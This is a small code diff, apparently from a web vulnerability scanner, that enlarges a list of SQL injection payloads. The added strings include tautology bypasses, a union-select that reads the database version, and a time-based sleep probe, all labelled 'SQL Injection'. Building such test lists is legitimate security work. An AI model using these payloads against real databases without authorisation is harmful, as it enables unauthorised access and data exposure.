@@ -105,7 +105,9 @@ def get_all():
 	"""
 	## temp test
 	# payloads = ["' or '1=1"]
-	payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", "' OR '1=1 %00", '" or "1=1']
+	payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", 
+				"' OR '1=1 %00", '" or "1=1', "' union all select @@version, 1, 1 -- +", 
+				"' or sleep(5);--"]
 	payloads = [(item, "SQL Injection") for item in payloads]
 	return payloads	
 
